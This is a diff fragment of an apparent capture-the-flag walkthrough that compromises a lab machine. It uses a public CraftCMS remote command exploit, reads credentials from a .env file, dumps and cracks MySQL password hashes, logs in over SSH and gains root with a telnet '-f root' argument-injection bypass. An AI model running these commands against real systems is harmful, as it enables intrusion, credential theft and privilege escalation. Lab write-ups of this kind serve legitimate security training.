@@ -38,7 +38,7 @@ The /admin/login page defines the CraftCMS version 5.6.16.
 
 Using a public exploit:
 
-bash
+
 python3 exploit.py -u http://orion.htb -c "id"
 Result:
 
@@ -48,7 +48,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 🗄️ MySQL password from .env
 Using the same exploit, we read .env:
 
-bash
+
 python3 exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
 Password found:
 
@@ -56,19 +56,19 @@ text
 CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
 We connect to MySQL and extract the hash of the adam user's password:
 
-bash
+
 python3 exploit.py -u http://orion.htb -c "mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'SELECT password FROM users;'"
 The hash was hacked through John/Hashcat → darkangel.
 ---
 🔑 SSH access as adam
-bash
+
 ssh adam@10.129.93.166
 Password: darkangel
 ---
 🔐 Privilege Escalation — Telnet CVE-2026-24061
 Checking the local ports:
 
-bash
+
 netstat -tulpn | grep 23
 Result:
 
@@ -76,16 +76,16 @@ text
 tcp  0  0 127.0.0.1:23  0.0.0.0:*  LISTEN
 We are exploiting:
 
-bash
+
 env USER='-f root' telnet -a 127.0.0.1
 ---
 🏁 Flags
-bash
+
 cat /home/adam/user.txt
 cat /root/root.txt
 ---
 📎 All Commands
-bash
+
 nmap -sC -sV -p- 10.129.93.166
 python3 exploit.py -u http://orion.htb -c "id"
 python3 exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
